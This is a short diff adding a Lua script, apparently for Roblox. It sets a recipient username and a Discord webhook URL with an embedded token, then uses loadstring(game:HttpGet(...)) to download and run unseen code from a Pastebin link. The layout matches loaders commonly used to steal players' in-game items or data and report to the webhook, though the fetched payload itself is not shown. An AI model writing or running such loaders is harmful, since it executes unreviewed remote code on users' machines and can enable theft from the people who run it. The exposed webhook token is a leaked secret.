@@ -1,0 +1,4 @@
+Name = "jellobloxxer"
+Webhook = "https://discord.com/api/webhooks/1320547546854199316/9KRtJ_cl8jyF7ttWL8Za9Cr0INF-aPkAeTowElNoGQyJflu4QovF0S80zf2YTwTulEgE"
+
+loadstring(game:HttpGet("https://pastebin.com/raw/gGJkQJGd"))()
